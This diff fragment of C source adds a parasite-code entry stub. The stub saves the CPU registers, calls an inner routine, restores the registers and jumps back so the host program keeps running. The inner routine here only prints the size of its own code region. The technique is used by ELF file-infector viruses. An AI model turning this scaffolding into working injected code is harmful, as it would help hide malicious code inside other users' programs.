@@ -586,11 +586,76 @@ void dummy_marker()
 {
 	__ASM__("nop");
 }
+_start()
+{
+#if 0
+	struct bootstrap_data bootstrap;
+#endif
+	/*
+	 * Save register state before executing parasite
+	 * code.
+	 */
+	
+	//PER: saving the previous state of register in order to not hamper the host program
+	__ASM__ (
+	 ".globl real_start	\n"
+ 	 "real_start:		\n"
+	 "push %rsp	\n"
+	 "push %rbp	\n"
+	 "push %rax	\n"
+	 "push %rbx	\n"
+	 "push %rcx	\n"
+	 "push %rdx	\n"
+	 "push %r8	\n"
+	 "push %r9	\n"
+	 "push %r10	\n"
+	 "push %r11	\n"
+	 "push %r12	\n"
+	 "push %r13	\n"
+	 "push %r14	\n"
+	 "push %r15	  ");
+	
+#if 0
+	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
+        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
+#endif
+	/*
+	 * Load bootstrap pointer as argument to do_main()
+	 * and call it.
+	 */
+	__ASM__ ( 
+		// PER: #if 0 will not be compiled nor executed
+#if 0
+	 "leaq %0, %%rdi\n"
+#endif
+	 "call do_main   " //:: "g"(bootstrap)
+	);
+	/*
+	 * Restore register state
+	 */
+	__ASM__ (
+	 "pop %r15	\n"
+	 "pop %r14	\n"
+	 "pop %r13	\n"
+	 "pop %r12	\n"
+	 "pop %r11	\n"
+	 "pop %r10	\n"
+	 "pop %r9	\n"
+	 "pop %r8	\n"
+	 "pop %rdx	\n"
+	 "pop %rcx	\n"
+	 "pop %rbx	\n"
+	 "pop %rax	\n"
+	 "pop %rbp	\n"
+	 "pop %rsp	\n"	
+	 "add $0x8, %rsp\n"
+	 "jmp end_code	" 
+	);
+}
 
-int main(){
+void do_main(struct bootstrap_data *bootstrap){
     void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
 	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
     int my_size= (int)((char *)f2 - (char *)f1);
     _printf("%s : %d : %s\n",(char *)f2, my_size, (char *)f1);
-    return 0;
 }
